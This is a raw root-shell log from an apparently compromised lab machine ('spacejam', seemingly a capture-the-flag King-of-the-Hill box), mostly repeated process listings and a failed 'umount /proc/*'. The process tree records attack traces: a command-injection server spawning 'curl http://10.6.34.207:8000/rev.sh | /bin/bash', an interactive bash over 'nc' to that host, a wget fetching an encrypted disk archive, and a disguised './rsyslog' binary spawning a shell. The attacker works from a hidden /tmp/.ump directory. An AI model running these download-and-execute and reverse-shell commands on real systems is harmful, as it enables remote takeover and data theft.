root        62     2  0 18:05 ?        00:00:00   [scsi_tmf_1]
root        64     2  0 18:05 ?        00:00:00   [bioset]
root        69     2  0 18:05 ?        00:00:00   [ipv6_addrconf]
root        82     2  0 18:05 ?        00:00:00   [bioset]
root        83     2  0 18:05 ?        00:00:00   [deferwq]
root        84     2  0 18:05 ?        00:00:00   [charger_manager]
root       122     2  0 18:05 ?        00:00:00   [bioset]
root       123     2  0 18:05 ?        00:00:00   [bioset]
root       124     2  0 18:05 ?        00:00:00   [bioset]
root       125     2  0 18:05 ?        00:00:00   [bioset]
root       126     2  0 18:05 ?        00:00:00   [bioset]
root       127     2  0 18:05 ?        00:00:00   [bioset]
root       128     2  0 18:05 ?        00:00:00   [bioset]
root       129     2  0 18:05 ?        00:00:00   [bioset]
root       130     2  0 18:05 ?        00:00:00   [kpsmoused]
root       150     2  0 18:05 ?        00:00:00   [ttm_swap]
root       223     2  0 18:05 ?        00:00:00   [kworker/0:1H]
root       231     2  0 18:05 ?        00:00:00   [raid5wq]
root       257     2  0 18:05 ?        00:00:00   [bioset]
root       286     2  0 18:05 ?        00:00:00   [jbd2/xvda1-8]
root       287     2  0 18:05 ?        00:00:00   [ext4-rsv-conver]
root       370     2  0 18:05 ?        00:00:00   [kauditd]
root       391     2  0 18:05 ?        00:00:00   [iscsi_eh]
root       409     2  0 18:05 ?        00:00:00   [ib_addr]
root       420     2  0 18:05 ?        00:00:00   [ib_mcast]
root       421     2  0 18:05 ?        00:00:00   [ib_nl_sa_wq]
root       422     2  0 18:05 ?        00:00:00   [ib_cm]
root       423     2  0 18:05 ?        00:00:00   [iw_cm_wq]
root       424     2  0 18:05 ?        00:00:00   [rdma_cm]
root      1958     2  0 18:24 ?        00:00:00   [kworker/u30:2]
root      2713     2  0 18:45 ?        00:00:00   [kworker/0:5]
root      2873     2  0 18:46 ?        00:00:00   [kworker/0:7]
root      3345     2  0 18:52 ?        00:00:00   [kworker/0:0]
root      3518     2  0 18:57 ?        00:00:00   [kworker/0:1]
root         1     0  0 18:04 ?        00:00:10 /sbin/init
root       337     1  0 18:05 ?        00:00:00   /lib/systemd/systemd-journald
root       387     1  0 18:05 ?        00:00:00   /sbin/lvmetad -f
root       417     1  0 18:05 ?        00:00:00   /lib/systemd/systemd-udevd
systemd+   498     1  0 18:05 ?        00:00:00   /lib/systemd/systemd-timesyncd
root       727     1  0 18:05 ?        00:00:00   /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root       884     1  0 18:05 ?        00:00:00   /sbin/iscsid
root       885     1  0 18:05 ?        00:00:00   /sbin/iscsid
root       888     1  0 18:05 ?        00:00:00   /usr/sbin/inetd -i
message+   891     1  0 18:05 ?        00:00:00   /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
jordan     894     1  0 18:05 ?        00:00:00   python3 /home/jordan/easyaccess.py
root       907     1  0 18:05 ?        00:00:00   /bin/koth
syslog     917     1  0 18:05 ?        00:00:00   /usr/sbin/rsyslogd -n
root       924     1  0 18:05 ?        00:00:00   /usr/sbin/acpid
daemon     927     1  0 18:05 ?        00:00:00   /usr/sbin/atd -f
root       930     1  0 18:05 ?        00:00:03   /usr/bin/lxcfs /var/lib/lxcfs/
root       940     1  0 18:05 ?        00:00:00   /usr/sbin/cron -f
root       947     1  0 18:05 ?        00:00:00   /usr/lib/accountsservice/accounts-daemon
root       953     1  0 18:05 ?        00:00:00   /lib/systemd/systemd-logind
root       956     1  0 18:05 ?        00:00:00   /usr/lib/snapd/snapd
root       971     1  0 18:05 ?        00:00:00   /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
root      1065     1  0 18:05 ttyS0    00:00:00   /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
root      1067     1  0 18:05 tty1     00:00:00   /sbin/agetty --noclear tty1 linux
root      1077     1  0 18:05 ?        00:00:00   /usr/sbin/sshd -D
root      3553  1077  0 18:59 ?        00:00:00     sshd: root@notty
root      3588  3553  0 18:59 ?        00:00:00       -bash
root      3594  1077  0 18:59 ?        00:00:00     sshd: jordan [priv]
jordan    3634  3594  0 18:59 ?        00:00:00       sshd: jordan@notty
jordan    3636  3634  0 18:59 ?        00:00:00         -bash
mysql     1083     1  0 18:05 ?        00:00:01   /usr/sbin/mysqld
root      1094     1  0 18:05 ?        00:00:00   /usr/lib/policykit-1/polkitd --no-debug
root      1129     1  0 18:05 ?        00:00:00   /usr/sbin/apache2 -k start
jordan    1185  1129  0 18:05 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1188  1129  0 18:05 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1316  1129  0 18:06 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1374  1129  0 18:08 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1477  1129  0 18:11 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1504  1129  0 18:13 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1537  1129  0 18:14 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1538  1129  0 18:14 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1539  1129  0 18:14 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1658  1129  0 18:16 ?        00:00:00     /usr/sbin/apache2 -k start
postgres  1143     1  0 18:05 ?        00:00:00   /usr/lib/postgresql/9.3/bin/postgres -D /var/lib/postgresql/9.3/main -c config_file=/etc/postgresql/9.3/main/postgresql.conf
postgres  1169  1143  0 18:05 ?        00:00:00     postgres: checkpointer process   
postgres  1170  1143  0 18:05 ?        00:00:00     postgres: writer process   
postgres  1171  1143  0 18:05 ?        00:00:00     postgres: wal writer process   
postgres  1172  1143  0 18:05 ?        00:00:00     postgres: autovacuum launcher process   
postgres  1173  1143  0 18:05 ?        00:00:00     postgres: stats collector process   
root      1273     1  0 18:05 ?        00:00:00   /usr/bin/node /usr/lib/node_modules/forever/bin/monitor /home/bunny/simple-command-injection/server.js
root      1284  1273  0 18:05 ?        00:00:00     /usr/bin/node /home/bunny/simple-command-injection/server.js
root      2364  1284  0 18:34 ?        00:00:00       /bin/sh -c curl http://10.6.34.207:8000/rev.sh | /bin/bash
root      2366  2364  0 18:34 ?        00:00:00         /bin/bash
root      2369  2366  0 18:34 ?        00:00:00           cat /tmp/.thm-jitter
root      2370  2366  0 18:34 ?        00:00:00           /bin/bash -i
root      3638  2370  0 18:59 ?        00:00:00             ps -efH
root      2371  2366  0 18:34 ?        00:00:00           nc 10.6.34.207 32214
root      3263  1284  0 18:50 ?        00:00:00       /bin/sh -c ./rsyslog
root      3264  3263  0 18:50 ?        00:00:00         ./rsyslog
root      3268  3264  0 18:50 ?        00:00:00           /bin/sh
root      1488     1  0 18:12 ?        00:00:00   /usr/bin/systemd-pam
root      1525     1  0 18:14 ?        00:00:01   /usr/lib/snapd/snapd
root      2654     1  0 18:43 ?        00:00:00   /bin/sh
root      2878     1  0 18:46 ?        00:00:00   /lib/systemd/systemd --user
root      2880  2878  0 18:46 ?        00:00:00     (sd-pam)
root      2928     1  0 18:46 ?        00:00:00   wget http://10.6.34.207:8000/disk.tar.enc -O /tmp/disk/disk.tar.pull.enc
jordan    3596     1  0 18:59 ?        00:00:00   /lib/systemd/systemd --user
jordan    3598  3596  0 18:59 ?        00:00:00     (sd-pam)
root@spacejam:/tmp/.ump# .[A
ps -efH
UID        PID  PPID  C STIME TTY          TIME CMD
root         2     0  0 18:04 ?        00:00:00 [kthreadd]
root         3     2  0 18:04 ?        00:00:00   [ksoftirqd/0]
root         5     2  0 18:04 ?        00:00:00   [kworker/0:0H]
root         7     2  0 18:04 ?        00:00:00   [rcu_sched]
root         8     2  0 18:04 ?        00:00:00   [rcu_bh]
root         9     2  0 18:04 ?        00:00:00   [migration/0]
root        10     2  0 18:04 ?        00:00:00   [watchdog/0]
root        11     2  0 18:04 ?        00:00:00   [kdevtmpfs]
root        12     2  0 18:04 ?        00:00:00   [netns]
root        13     2  0 18:04 ?        00:00:00   [perf]
root        14     2  0 18:04 ?        00:00:00   [xenwatch]
root        15     2  0 18:04 ?        00:00:00   [xenbus]
root        17     2  0 18:04 ?        00:00:00   [khungtaskd]
root        18     2  0 18:04 ?        00:00:00   [writeback]
root        19     2  0 18:04 ?        00:00:00   [ksmd]
root        20     2  0 18:04 ?        00:00:00   [khugepaged]
root        21     2  0 18:04 ?        00:00:00   [crypto]
root        22     2  0 18:04 ?        00:00:00   [kintegrityd]
root        23     2  0 18:04 ?        00:00:00   [bioset]
root        24     2  0 18:04 ?        00:00:00   [kblockd]
root        25     2  0 18:04 ?        00:00:00   [ata_sff]
root        26     2  0 18:04 ?        00:00:00   [md]
root        27     2  0 18:04 ?        00:00:00   [devfreq_wq]
root        28     2  0 18:04 ?        00:00:00   [kworker/u30:1]
root        30     2  0 18:04 ?        00:00:00   [kswapd0]
root        31     2  0 18:04 ?        00:00:00   [vmstat]
root        32     2  0 18:04 ?        00:00:00   [fsnotify_mark]
root        33     2  0 18:04 ?        00:00:00   [ecryptfs-kthrea]
root        49     2  0 18:04 ?        00:00:00   [kthrotld]
root        50     2  0 18:05 ?        00:00:00   [acpi_thermal_pm]
root        51     2  0 18:05 ?        00:00:00   [bioset]
root        52     2  0 18:05 ?        00:00:00   [bioset]
root        53     2  0 18:05 ?        00:00:00   [bioset]
root        54     2  0 18:05 ?        00:00:00   [bioset]
root        55     2  0 18:05 ?        00:00:00   [bioset]
root        56     2  0 18:05 ?        00:00:00   [bioset]
root        57     2  0 18:05 ?        00:00:00   [bioset]
root        58     2  0 18:05 ?        00:00:00   [bioset]
root        59     2  0 18:05 ?        00:00:00   [scsi_eh_0]
root        60     2  0 18:05 ?        00:00:00   [scsi_tmf_0]
root        61     2  0 18:05 ?        00:00:00   [scsi_eh_1]
root        62     2  0 18:05 ?        00:00:00   [scsi_tmf_1]
root        64     2  0 18:05 ?        00:00:00   [bioset]
root        69     2  0 18:05 ?        00:00:00   [ipv6_addrconf]
root        82     2  0 18:05 ?        00:00:00   [bioset]
root        83     2  0 18:05 ?        00:00:00   [deferwq]
root        84     2  0 18:05 ?        00:00:00   [charger_manager]
root       122     2  0 18:05 ?        00:00:00   [bioset]
root       123     2  0 18:05 ?        00:00:00   [bioset]
root       124     2  0 18:05 ?        00:00:00   [bioset]
root       125     2  0 18:05 ?        00:00:00   [bioset]
root       126     2  0 18:05 ?        00:00:00   [bioset]
root       127     2  0 18:05 ?        00:00:00   [bioset]
root       128     2  0 18:05 ?        00:00:00   [bioset]
root       129     2  0 18:05 ?        00:00:00   [bioset]
root       130     2  0 18:05 ?        00:00:00   [kpsmoused]
root       150     2  0 18:05 ?        00:00:00   [ttm_swap]
root       223     2  0 18:05 ?        00:00:00   [kworker/0:1H]
root       231     2  0 18:05 ?        00:00:00   [raid5wq]
root       257     2  0 18:05 ?        00:00:00   [bioset]
root       286     2  0 18:05 ?        00:00:00   [jbd2/xvda1-8]
root       287     2  0 18:05 ?        00:00:00   [ext4-rsv-conver]
root       370     2  0 18:05 ?        00:00:00   [kauditd]
root       391     2  0 18:05 ?        00:00:00   [iscsi_eh]
root       409     2  0 18:05 ?        00:00:00   [ib_addr]
root       420     2  0 18:05 ?        00:00:00   [ib_mcast]
root       421     2  0 18:05 ?        00:00:00   [ib_nl_sa_wq]
root       422     2  0 18:05 ?        00:00:00   [ib_cm]
root       423     2  0 18:05 ?        00:00:00   [iw_cm_wq]
root       424     2  0 18:05 ?        00:00:00   [rdma_cm]
root      1958     2  0 18:24 ?        00:00:00   [kworker/u30:2]
root      2713     2  0 18:45 ?        00:00:00   [kworker/0:5]
root      2873     2  0 18:46 ?        00:00:00   [kworker/0:7]
root      3345     2  0 18:52 ?        00:00:00   [kworker/0:0]
root      3518     2  0 18:57 ?        00:00:00   [kworker/0:1]
root      3644     2  0 18:59 ?        00:00:00   [kworker/0:2]
root         1     0  0 18:04 ?        00:00:10 /sbin/init
root       337     1  0 18:05 ?        00:00:00   /lib/systemd/systemd-journald
root       387     1  0 18:05 ?        00:00:00   /sbin/lvmetad -f
root       417     1  0 18:05 ?        00:00:00   /lib/systemd/systemd-udevd
systemd+   498     1  0 18:05 ?        00:00:00   /lib/systemd/systemd-timesyncd
root       727     1  0 18:05 ?        00:00:00   /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root       884     1  0 18:05 ?        00:00:00   /sbin/iscsid
root       885     1  0 18:05 ?        00:00:00   /sbin/iscsid
root       888     1  0 18:05 ?        00:00:00   /usr/sbin/inetd -i
message+   891     1  0 18:05 ?        00:00:00   /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
jordan     894     1  0 18:05 ?        00:00:00   python3 /home/jordan/easyaccess.py
root       907     1  0 18:05 ?        00:00:00   /bin/koth
syslog     917     1  0 18:05 ?        00:00:00   /usr/sbin/rsyslogd -n
root       924     1  0 18:05 ?        00:00:00   /usr/sbin/acpid
daemon     927     1  0 18:05 ?        00:00:00   /usr/sbin/atd -f
root       930     1  0 18:05 ?        00:00:03   /usr/bin/lxcfs /var/lib/lxcfs/
root       940     1  0 18:05 ?        00:00:00   /usr/sbin/cron -f
root       947     1  0 18:05 ?        00:00:00   /usr/lib/accountsservice/accounts-daemon
root       953     1  0 18:05 ?        00:00:00   /lib/systemd/systemd-logind
root       956     1  0 18:05 ?        00:00:00   /usr/lib/snapd/snapd
root       971     1  0 18:05 ?        00:00:00   /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
root      1065     1  0 18:05 ttyS0    00:00:00   /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
root      1067     1  0 18:05 tty1     00:00:00   /sbin/agetty --noclear tty1 linux
root      1077     1  0 18:05 ?        00:00:00   /usr/sbin/sshd -D
root      3553  1077  0 18:59 ?        00:00:00     sshd: root@notty
root      3588  3553  0 18:59 ?        00:00:00       -bash
mysql     1083     1  0 18:05 ?        00:00:01   /usr/sbin/mysqld
root      1094     1  0 18:05 ?        00:00:00   /usr/lib/policykit-1/polkitd --no-debug
root      1129     1  0 18:05 ?        00:00:00   /usr/sbin/apache2 -k start
jordan    1185  1129  0 18:05 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1188  1129  0 18:05 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1316  1129  0 18:06 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1374  1129  0 18:08 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1477  1129  0 18:11 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1504  1129  0 18:13 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1537  1129  0 18:14 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1538  1129  0 18:14 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1539  1129  0 18:14 ?        00:00:00     /usr/sbin/apache2 -k start
jordan    1658  1129  0 18:16 ?        00:00:00     /usr/sbin/apache2 -k start
postgres  1143     1  0 18:05 ?        00:00:00   /usr/lib/postgresql/9.3/bin/postgres -D /var/lib/postgresql/9.3/main -c config_file=/etc/postgresql/9.3/main/postgresql.conf
postgres  1169  1143  0 18:05 ?        00:00:00     postgres: checkpointer process   
postgres  1170  1143  0 18:05 ?        00:00:00     postgres: writer process   
postgres  1171  1143  0 18:05 ?        00:00:00     postgres: wal writer process   
postgres  1172  1143  0 18:05 ?        00:00:00     postgres: autovacuum launcher process   
postgres  1173  1143  0 18:05 ?        00:00:00     postgres: stats collector process   
root      1273     1  0 18:05 ?        00:00:00   /usr/bin/node /usr/lib/node_modules/forever/bin/monitor /home/bunny/simple-command-injection/server.js
root      1284  1273  0 18:05 ?        00:00:00     /usr/bin/node /home/bunny/simple-command-injection/server.js
root      2364  1284  0 18:34 ?        00:00:00       /bin/sh -c curl http://10.6.34.207:8000/rev.sh | /bin/bash
root      2366  2364  0 18:34 ?        00:00:00         /bin/bash
root      2369  2366  0 18:34 ?        00:00:00           cat /tmp/.thm-jitter
root      2370  2366  0 18:34 ?        00:00:00           /bin/bash -i
root      3650  2370  0 18:59 ?        00:00:00             ps -efH
root      2371  2366  0 18:34 ?        00:00:00           nc 10.6.34.207 32214
root      3263  1284  0 18:50 ?        00:00:00       /bin/sh -c ./rsyslog
root      3264  3263  0 18:50 ?        00:00:00         ./rsyslog
root      3268  3264  0 18:50 ?        00:00:00           /bin/sh
root      1488     1  0 18:12 ?        00:00:00   /usr/bin/systemd-pam
root      1525     1  0 18:14 ?        00:00:01   /usr/lib/snapd/snapd
root      2654     1  0 18:43 ?        00:00:00   /bin/sh
root      2878     1  0 18:46 ?        00:00:00   /lib/systemd/systemd --user
root      2880  2878  0 18:46 ?        00:00:00     (sd-pam)
root      2928     1  0 18:46 ?        00:00:00   wget http://10.6.34.207:8000/disk.tar.enc -O /tmp/disk/disk.tar.pull.enc
root@spacejam:/tmp/.ump# umount /proc/*
umount /proc/*
umount: /proc/1: not mounted
umount: /proc/10: not mounted
umount: /proc/1065: not mounted
umount: /proc/1067: not mounted
umount: /proc/1077: not mounted
umount: /proc/1083: not mounted
umount: /proc/1094: not mounted
umount: /proc/11: not mounted
umount: /proc/1129: not mounted
umount: /proc/1143: not mounted
umount: /proc/1169: not mounted
umount: /proc/1170: not mounted
umount: /proc/1171: not mounted
umount: /proc/1172: not mounted
umount: /proc/1173: not mounted
umount: /proc/1185: not mounted
umount: /proc/1188: not mounted
umount: /proc/12: not mounted
umount: /proc/122: not mounted
umount: /proc/123: not mounted
umount: /proc/124: not mounted
umount: /proc/125: not mounted
umount: /proc/126: not mounted
umount: /proc/127: not mounted
umount: /proc/1273: not mounted
umount: /proc/128: not mounted
umount: /proc/1284: not mounted
umount: /proc/129: not mounted
umount: /proc/13: not mounted
umount: /proc/130: not mounted
umount: /proc/1316: not mounted
umount: /proc/1374: not mounted
umount: /proc/14: not mounted
umount: /proc/1477: not mounted
umount: /proc/1488: not mounted
umount: /proc/15: not mounted
umount: /proc/150: not mounted
umount: /proc/1504: not mounted
umount: /proc/1525: not mounted
umount: /proc/1537: not mounted
umount: /proc/1538: not mounted
umount: /proc/1539: not mounted
umount: /proc/1658: not mounted
umount: /proc/17: not mounted
umount: /proc/18: not mounted
umount: /proc/19: not mounted
umount: /proc/1958: not mounted
umount: /proc/2: not mounted
umount: /proc/20: not mounted
umount: /proc/21: not mounted
umount: /proc/22: not mounted
umount: /proc/223: not mounted
umount: /proc/23: not mounted
umount: /proc/231: not mounted
umount: /proc/2364: not mounted
umount: /proc/2366: not mounted
umount: /proc/2369: not mounted
umount: /proc/2370: not mounted
umount: /proc/2371: not mounted
umount: /proc/24: not mounted
umount: /proc/25: not mounted
umount: /proc/257: not mounted
umount: /proc/26: not mounted
umount: /proc/2654: not mounted
umount: /proc/27: not mounted
umount: /proc/2713: not mounted
umount: /proc/28: not mounted
umount: /proc/286: not mounted
umount: /proc/287: not mounted
umount: /proc/2873: not mounted
umount: /proc/2878: not mounted
umount: /proc/2880: not mounted
umount: /proc/2928: not mounted
umount: /proc/3: not mounted
umount: /proc/30: not mounted
umount: /proc/31: not mounted
umount: /proc/32: not mounted
umount: /proc/3263: not mounted
umount: /proc/3264: not mounted
umount: /proc/3268: not mounted
umount: /proc/33: not mounted
umount: /proc/3345: not mounted
umount: /proc/337: not mounted
umount: /proc/3518: not mounted
umount: /proc/3553: not mounted
umount: /proc/3588: not mounted
umount: /proc/3644: not mounted
umount: /proc/370: not mounted
umount: /proc/387: not mounted
umount: /proc/391: not mounted
umount: /proc/409: not mounted
umount: /proc/417: not mounted
umount: /proc/420: not mounted
umount: /proc/421: not mounted
umount: /proc/422: not mounted
umount: /proc/423: not mounted
umount: /proc/424: not mounted
umount: /proc/49: not mounted
umount: /proc/498: not mounted
umount: /proc/5: not mounted
umount: /proc/50: not mounted
umount: /proc/51: not mounted
umount: /proc/52: not mounted
umount: /proc/53: not mounted
umount: /proc/54: not mounted
umount: /proc/55: not mounted
umount: /proc/56: not mounted
umount: /proc/57: not mounted
umount: /proc/58: not mounted
umount: /proc/59: not mounted
umount: /proc/60: not mounted
umount: /proc/61: not mounted
umount: /proc/62: not mounted
umount: /proc/64: not mounted
umount: /proc/69: not mounted
umount: /proc/7: not mounted
umount: /proc/727: not mounted
umount: /proc/8: not mounted
umount: /proc/82: not mounted
umount: /proc/83: not mounted
umount: /proc/84: not mounted
umount: /proc/884: not mounted
umount: /proc/885: not mounted
umount: /proc/888: not mounted
umount: /proc/891: not mounted
umount: /proc/894: not mounted
umount: /proc/9: not mounted
umount: /proc/907: not mounted
umount: /proc/917: not mounted
umount: /proc/924: not mounted
umount: /proc/927: not mounted
umount: /proc/930: not mounted
umount: /proc/940: not mounted
umount: /proc/947: not mounted
umount: /proc/953: not mounted
umount: /proc/956: not mounted
umount: /proc/971: not mounted
umount: /proc/acpi: not mounted
umount: /proc/buddyinfo: not mounted
umount: /proc/bus: not mounted
umount: /proc/cgroups: not mounted
umount: /proc/cmdline: not mounted
umount: /proc/consoles: not mounted
umount: /proc/cpuinfo: not mounted
umount: /proc/crypto: not mounted
umount: /proc/devices: not mounted
umount: /proc/diskstats: not mounted
umount: /proc/dma: not mounted
umount: /proc/driver: not mounted
umount: /proc/execdomains: not mounted
umount: /proc/fb: not mounted
umount: /proc/filesystems: not mounted
umount: /proc/fs: not mounted
umount: /proc/interrupts: not mounted
umount: /proc/iomem: not mounted
umount: /proc/ioports: not mounted
umount: /proc/irq: not mounted
umount: /proc/kallsyms: not mounted
umount: /proc/kcore: not mounted
umount: /proc/keys: not mounted
umount: /proc/key-users: not mounted
umount: /proc/kmsg: not mounted
umount: /proc/kpagecgroup: not mounted
umount: /proc/kpagecount: not mounted
umount: /proc/kpageflags: not mounted
umount: /proc/loadavg: not mounted
umount: /proc/locks: not mounted
umount: /proc/mdstat: not mounted
umount: /proc/meminfo: not mounted
umount: /proc/misc: not mounted
umount: /proc/modules: not mounted
umount: /proc/mounts: not mounted
umount: /proc/mtrr: not mounted
umount: /proc/net: not mounted
umount: /proc/pagetypeinfo: not mounted
umount: /proc/partitions: not mounted
umount: /proc/sched_debug: not mounted
umount: /proc/schedstat: not mounted
umount: /proc/scsi: not mounted
umount: /proc/self: not mounted
umount: /proc/slabinfo: not mounted
umount: /proc/softirqs: not mounted
umount: /proc/stat: not mounted
umount: /proc/swaps: not mounted
umount: /proc/sys: not mounted
umount: /proc/sysrq-trigger: not mounted
umount: /proc/sysvipc: not mounted
umount: /proc/thread-self: not mounted
umount: /proc/timer_list: not mounted
umount: /proc/timer_stats: not mounted
umount: /proc/tty: not mounted
umount: /proc/uptime: not mounted
umount: /proc/version: not mounted
umount: /proc/version_signature: not mounted
umount: /proc/vmallocinfo: not mounted
umount: /proc/vmstat: not mounted
umount: /proc/xen: not mounted
umount: /proc/zoneinfo: not mounted
root@spacejam:/tmp/.ump# ps -efH
ps -efH
UID        PID  PPID  C STIME TTY          TIME CMD
root         2     0  0 18:04 ?        00:00:00 [kthreadd]
root         3     2  0 18:04 ?        00:00:00   [ksoftirqd/0]
root         5     2  0 18:04 ?        00:00:00   [kworker/0:0H]
root         7     2  0 18:04 ?        00:00:00   [rcu_sched]
root         8     2  0 18:04 ?        00:00:00   [rcu_bh]
root         9     2  0 18:04 ?        00:00:00   [migration/0]
root        10     2  0 18:04 ?        00:00:00   [watchdog/0]
root        11     2  0 18:04 ?        00:00:00   [kdevtmpfs]
root        12     2  0 18:04 ?        00:00:00   [netns]
root        13     2  0 18:04 ?        00:00:00   [perf]
root        14     2  0 18:04 ?        00:00:00   [xenwatch]
root        15     2  0 18:04 ?        00:00:00   [xenbus]
root        17     2  0 18:04 ?        00:00:00   [khungtaskd]
root        18     2  0 18:04 ?        00:00:00   [writeback]
root        19     2  0 18:04 ?        00:00:00   [ksmd]
root        20     2  0 18:04 ?        00:00:00   [khugepaged]
root        21     2  0 18:04 ?        00:00:00   [crypto]
root        22     2  0 18:04 ?        00:00:00   [kintegrityd]
root        23     2  0 18:04 ?        00:00:00   [bioset]
root        24     2  0 18:04 ?        00:00:00   [kblockd]
root        25     2  0 18:04 ?        00:00:00   [ata_sff]
root        26     2  0 18:04 ?        00:00:00   [md]
root        27     2  0 18:04 ?        00:00:00   [devfreq_wq]
root        28     2  0 18:04 ?        00:00:00   [kworker/u30:1]
root        30     2  0 18:04 ?        00:00:00   [kswapd0]
root        31     2  0 18:04 ?        00:00:00   [vmstat]
root        32     2  0 18:04 ?        00:00:00   [fsnotify_mark]
root        33     2  0 18:04 ?        00:00:00   [ecryptfs-kthrea]
root        49     2  0 18:04 ?        00:00:00   [kthrotld]
root        50     2  0 18:05 ?        00:00:00   [acpi_thermal_pm]
root        51     2  0 18:05 ?        00:00:00   [bioset]
root        52     2  0 18:05 ?        00:00:00   [bioset]
root        53     2  0 18:05 ?        00:00:00   [bioset]
root        54     2  0 18:05 ?        00:00:00   [bioset]
root        55     2  0 18:05 ?        00:00:00   [bioset]
root        56     2  0 18:05 ?        00:00:00   [bioset]
root        57     2  0 18:05 ?        00:00:00   [bioset]
root        58     2  0 18:05 ?        00:00:00   [bioset]
root        59     2  0 18:05 ?        00:00:00   [scsi_eh_0]
root        60     2  0 18:05 ?        00:00:00   [scsi_tmf_0]
root        61     2  0 18:05 ?        00:00:00   [scsi_eh_1]
root        62     2  0 18:05 ?        00:00:00   [scsi_tmf_1]
root        64     2  0 18:05 ?        00:00:00   [bioset]
root        69     2  0 18:05 ?        00:00:00   [ipv6_addrconf]
root        82     2  0 18:05 ?        00:00:00   [bioset]
root        83     2  0 18:05 ?        00:00:00   [deferwq]
root        84     2  0 18:05 ?        00:00:00   [charger_manager]
root       122     2  0 18:05 ?        00:00:00   [bioset]
root       123     2  0 18:05 ?        00:00:00   [bioset]
root       124     2  0 18:05 ?        00:00:00   [bioset]
root       125     2  0 18:05 ?        00:00:00   [bioset]
root       126     2  0 18:05 ?        00:00:00   [bioset]
root       127     2  0 18:05 ?        00:00:00   [bioset]
root       128     2  0 18:05 ?        00:00:00   [bioset]
root       129     2  0 18:05 ?        00:00:00   [bioset]
root       130     2  0 18:05 ?        00:00:00   [kpsmoused]
root       150     2  0 18:05 ?        00:00:00   [ttm_swap]
root       223     2  0 18:05 ?        00:00:00   [kworker/0:1H]
root       231     2  0 18:05 ?        00:00:00   [raid5wq]
root       257     2  0 18:05 ?        00:00:00   [bioset]
root       286     2  0 18:05 ?        00:00:00   [jbd2/xvda1-8]
root       287     2  0 18:05 ?        00:00:00   [ext4-rsv-conver]
root       370     2  0 18:05 ?        00:00:00   [kauditd]
root       391     2  0 18:05 ?        00:00:00   [iscsi_eh]
root       409     2  0 18:05 ?        00:00:00   [ib_addr]
root       420     2  0 18:05 ?        00:00:00   [ib_mcast]
root       421     2  0 18:05 ?        00:00:00   [ib_nl_sa_wq]
root       422     2  0 18:05 ?        00:00:00   [ib_cm]
root       423     2  0 18:05 ?        00:00:00   [iw_cm_wq]
root       424     2  0 18:05 ?        00:00:00   [rdma_cm]
root      1958     2  0 18:24 ?        00:00:00   [kworker/u30:2]
root      2713     2  0 18:45 ?        00:00:00   [kworker/0:5]
root      2873     2  0 18:46 ?        00:00:00   [kworker/0:7]
root      3345     2  0 18:52 ?        00:00:00   [kworker/0:0]
root      3518     2  0 18:57 ?        00:00:00   [kworker/0:1]
root      3644     2  0 18:59 ?        00:00:00   [kworker/0:2]
root         1     0  0 18:04 ?        00:00:10 /sbin/init
root       337     1  0 18:05 ?        00:00:00   /lib/systemd/systemd-journald
root       387     1  0 18:05 ?        00:00:00   /sbin/lvmetad -f
root       417     1  0 18:05 ?        00:00:00   /lib/systemd/systemd-udevd
systemd+   498     1  0 18:05 ?        00:00:00   /lib/systemd/systemd-timesyncd
root       727     1  0 18:05 ?        00:00:00   /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root       884     1  0 18:05 ?        00:00:00   /sbin/iscsid
root       885     1  0 18:05 ?        00:00:00   /sbin/iscsid
root       888     1  0 18:05 ?        00:00:00   /usr/sbin/inetd -i
message+   891     1  0 18:05 ?        00:00:00   /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
jordan     894     1  0 18:05 ?        00:00:00   python3 /home/jordan/easyaccess.py
root       907     1  0 18:05 ?        00:00:00   /bin/koth
syslog     917     1  0 18:05 ?        00:00:00   /usr/sbin/rsyslogd -n
root       924     1  0 18:05 ?        00:00:00   /usr/sbin/acpid
daemon     927     1  0 18:05 ?        00:00:00   /usr/sbin/atd -f
root       930     1  0 18:05 ?        00:00:03   /usr/bin/lxcfs /var/lib/lxcfs/
root       940     1  0 18:05 ?        00:00:00   /usr/sbin/cron -f
root       947     1  0 18:05 ?        00:00:00   /usr/lib/accountsservice/accounts-daemon
root       953     1  0 18:05 ?        00:00:00   /lib/systemd/systemd-logind
root       956     1  0 18:05 ?        00:00:00   /usr/lib/snapd/snapd
root       971     1  0 18:05 ?        00:00:00   /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
root      1065     1  0 18:05 ttyS0    00:00:00   /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
root      1067     1  0 18:05 tty1     00:00:00   /sbin/agetty --noclear tty1 linux
root      1077     1  0 18:05 ?        00:00:00   /usr/sbin/sshd -D
root      3553  1077  0 18:59 ?        00:00:00     sshd: root@notty
root      3588  3553  0 18:59 ?        00:00:00       -bash
